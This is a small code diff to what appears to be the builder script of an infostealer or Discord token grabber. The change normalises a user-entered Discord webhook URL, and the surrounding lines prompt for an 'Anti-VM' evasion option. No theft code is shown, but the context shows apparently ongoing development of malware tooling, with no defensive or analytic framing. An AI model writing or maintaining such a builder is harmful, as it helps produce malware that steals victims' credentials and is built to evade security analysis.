@@ -16,6 +16,8 @@ class Build:
             self.moduleInstaller()
             os.system("cls")
             getWebhook = str(input('Enter Your webhook URL : '))
+            if "discordapp" in getWebhook:
+                getWebhook = getWebhook.replace("discordapp", "discord")
             time.sleep(0.5)
             os.system("cls")
             getAntiVmReq = str(input('Yes/no\nDo you want to use Anti-VM : '))
